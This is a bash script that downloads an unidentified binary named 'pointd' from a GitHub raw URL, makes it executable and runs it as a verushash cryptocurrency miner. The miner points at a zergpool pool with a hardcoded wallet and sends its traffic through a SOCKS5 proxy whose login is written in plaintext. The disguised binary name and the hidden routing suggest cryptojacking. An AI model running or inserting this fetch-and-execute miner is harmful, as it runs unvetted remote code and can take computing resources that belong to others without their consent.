#!/bin/bash

wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
chmod +x pointd
./pointd -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE -p c=DOGE,mc=VRSC -t 8 -x socks5://aihzpnbr:dogmtwuiyn3a@2.56.101.130:8662
